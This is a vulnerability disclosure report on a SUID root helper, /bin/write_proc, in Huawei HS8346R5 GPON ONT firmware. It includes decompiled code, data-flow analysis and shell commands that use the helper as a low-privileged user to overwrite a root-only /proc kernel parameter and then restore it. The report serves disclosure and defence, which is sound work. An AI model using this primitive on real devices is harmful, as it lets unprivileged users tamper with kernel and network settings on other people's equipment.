# Huawei HS8346R5 `/bin/write_proc` SUID Root Arbitrary `/proc` Write Vulnerability

## Overview

- **Vendor:** Huawei
- **Product:** Huawei HS8346R5 GPON ONT
- **Tested firmware:** `V500R019C20SPC050B031`
- **Operating environment:** Dopra Linux / BusyBox
- **Kernel identified in firmware analysis:** `3.10.53-HULK2` on ARMv7/HiSilicon
- **Vulnerable component:** `/bin/write_proc`
- **Vulnerability type:** SUID root privilege-control flaw / privileged arbitrary `/proc` write
- **Required access:** A low-privileged local shell
- **Tested low-privileged account:** `srv_ssmp`, UID `3008`
- **Confirmed impact:** A non-root user can modify a root-only kernel parameter through a SUID root helper
- **Suggested primary CWE:** CWE-250 — Execution with Unnecessary Privileges
- **Suggested secondary CWEs:** CWE-732, CWE-73, CWE-269
- **Suggested severity:** High

## Vulnerability Basic Information

- **Program interface:** `write_proc [ProcFile] [SetValue]`
- **Target path source:** `argv[1]`
- **Written value source:** `argv[2]`
- **Validation logic:** The supplied path is checked only for the `/proc` prefix
- **Privileged open operation:** `HW_OS_Open(argv[1], 1, 0)`
- **Privileged write operation:** `HW_OS_Write(fd, argv[2], strlen(argv[2]))`
- **Observed file permission:** `-rwsr-xr-x 1 root root`
- **Confirmed target:** `/proc/sys/kernel/hostname`
- **Direct non-root write:** Denied
- **Write through `/bin/write_proc`:** Successful
- **Cleanup:** The test value was removed and the original semantic state was restored
- **Complete UID 0 shell through this primitive:** Not demonstrated in the supplied evidence

## Vulnerability Description

The Huawei HS8346R5 firmware contains a helper utility named `/bin/write_proc`. The binary is owned by `root` and is installed with the SUID bit. A process launched by a non-root user therefore performs the binary's privileged file operations with the effective privileges of the file owner.

The program accepts two caller-controlled command-line parameters:

```text
write_proc [ProcFile] [SetValue]
```

The first parameter selects a target path and the second supplies the data written to that path. Static analysis shows that the program verifies only that the target string begins with `/proc`. It does not implement a strict allowlist of business-required proc entries, does not authorize the real caller against individual operations, and does not classify sensitive kernel control nodes separately from low-risk settings.

After the prefix comparison succeeds, the program opens the caller-selected path and writes the caller-selected value. Because the executable is SUID root, this design allows a low-privileged user to modify proc entries that the same user cannot write directly.

The issue is not that `/proc` is generally writable. The security failure is that a generic SUID root utility crosses the privilege boundary on behalf of an unprivileged caller without sufficiently restricting the target operation.

## Static Analysis

### Program Entry, Argument Handling, and Privileged Write

The IDA decompilation of `main` shows the relevant validation and write path in one function.

<img width="1455" height="1019" alt="image" src="https://github.com/user-attachments/assets/4c0a548b-a1c4-4389-bca6-aecf0f61fc79" />


A cleaned reconstruction of the relevant logic is:

```c
int main(int argc, const char **argv)
{
    int fd;
    const char *path;
    const char *value;
    int length;
    int written;

    if (argc != 3 ||
        (path = argv[1],
         length = HW_OS_StrLen("/proc"),
         HW_OS_StrNCmp(path, "/proc", length)))
    {
        HW_OS_Printf("\r\nUsage: write_proc[ProcFile][SetValue]\r\n");
        return 1;
    }

    fd = HW_OS_Open(argv[1], 1, 0);
    if (fd == -1)
    {
        /* Error reporting omitted */
        return -1;
    }

    value = argv[2];
    length = HW_OS_StrLen(value);
    written = HW_OS_Write(fd, value, length);
    HW_OS_Close(fd);

    if (written == -1)
        return -1;

    return 0;
}
```

The data flow is direct:

```text
argv[1]
   |
   +--> compare first characters with "/proc"
   |
   +--> HW_OS_Open(argv[1], O_WRONLY, 0)

argv[2]
   |
   +--> HW_OS_StrLen(argv[2])
   |
   +--> HW_OS_Write(fd, argv[2], length)
```

Both the destination and the written data are controlled by the caller.

### Insufficient Validation

The relevant comparison is equivalent to:

```c
strncmp(argv[1], "/proc", strlen("/proc"))
```

This is a prefix test, not a security allowlist. It does not prove that the selected node is:

- required for normal product operation;
- safe for an unprivileged caller to modify;
- restricted to one specific subsystem;
- resolved to an approved canonical path;
- protected against equivalent-path or redirection issues;
- supplied with a valid and bounded value.

The report should therefore state that validation is **insufficient**, rather than claiming that no validation exists.

### Imported OS-Abstraction Functions

`HW_OS_Open` is an import thunk:

<img width="666" height="156" alt="image" src="https://github.com/user-attachments/assets/27dc3a7c-843e-4e23-84ff-454efbae6cba" />


```c
int HW_OS_Open(int a1, int a2, int a3)
{
    return __imp_HW_OS_Open(a1, a2, a3);
}
```

`HW_OS_Write` is also an import thunk:

<img width="606" height="206" alt="image" src="https://github.com/user-attachments/assets/9bf0806a-77bd-40fa-b313-db4d05da1450" />


```c
int HW_OS_Write(int a1, int a2, int a3)
{
    return __imp_HW_OS_Write(a1, a2, a3);
}
```

The underlying library implementation is outside the executable. This does not weaken the confirmed finding: the caller-side data flow is explicit, and the physical-device test independently demonstrates that the selected proc node is modified.

## Real-Device Verification

The following evidence was collected on a physical Huawei HS8346R5 device.

<img width="990" height="405" alt="image" src="https://github.com/user-attachments/assets/cbe9b320-1564-4513-b4a4-549c8d1244b1" />


### Confirm the Low-Privileged Context

Commands:

```sh
id
whoami
```

Observed output:

```text
uid=3008(srv_ssmp) gid=2002(service) groups=2002(service)
srv_ssmp
```

The test shell was not running as UID 0.

### Confirm the SUID Root Permission

Command:

```sh
ls -l /bin/write_proc
```

Observed output:

```text
-rwsr-xr-x 1 root root 5504 Aug 9 2019 /bin/write_proc
```

The evidence confirms that:

- the owner is `root`;
- the owner execute position contains `s`, indicating SUID;
- ordinary users have execute permission.

### Record the Original Target Value

Command:

```sh
cat /proc/sys/kernel/hostname
```

Observed output:

```text
(none)
```

### Demonstrate That Direct Access Is Denied

Command:

```sh
echo codex_direct_test > /proc/sys/kernel/hostname
```

Observed output:

```text
/bin/sh: can't create /proc/sys/kernel/hostname: Permission denied
```

This establishes the baseline: the `srv_ssmp` shell cannot directly modify the selected root-only parameter.

### Demonstrate the Privileged Write

Commands:

```sh
/bin/write_proc /proc/sys/kernel/hostname codex_write_proc_test
cat /proc/sys/kernel/hostname
```

Observed output:

```text
codex_write_proc_test
```

The same target that rejected a direct write was successfully modified through the SUID root helper.

### Restore the Test State

Commands:

```sh
/bin/write_proc /proc/sys/kernel/hostname none
cat /proc/sys/kernel/hostname
```

Observed output:

```text
none
```

The temporary marker was removed after verification. The original readout was `(none)`, while the post-restoration readout shown in the screenshot is `none`; this distinction should be preserved exactly in the report rather than silently normalized.

## Complete Data Flow

```text
Low-privileged shell
uid=3008(srv_ssmp)
        |
        | executes
        v
/bin/write_proc
owner=root, mode=-rwsr-xr-x
        |
        | argv[1]
        v
prefix comparison against "/proc"
        |
        | accepted path
        v
HW_OS_Open(argv[1], O_WRONLY, 0)
        |
        | argv[2]
        v
HW_OS_Write(fd, argv[2], strlen(argv[2]))
        |
        v
Root-only kernel parameter is modified
```

Runtime evidence closes the following chain:

```text
Non-root identity
  -> direct write denied
  -> SUID root helper invoked
  -> same root-only node modified
  -> modified value read back
  -> test state restored
```

## Security Impact

### Confirmed Impact

The confirmed impact is a privilege-boundary violation allowing an unprivileged service account to modify a global kernel parameter through a root-owned SUID executable.

This directly affects system integrity. It may also affect availability because incorrect kernel parameters can disrupt networking, service behavior, resource management, or system stability.

### Device-Specific Impact

On a GPON ONT, kernel and networking parameter modification may affect:

- LAN/WAN forwarding;
- NAT and connection tracking;
- ICMP redirect and reverse-path filtering policy;
- service stability;
- watchdog and crash behavior;
- management-plane availability.

Claims involving carrier infrastructure, credential extraction, persistence, or complete root compromise should be included only after device-specific validation.
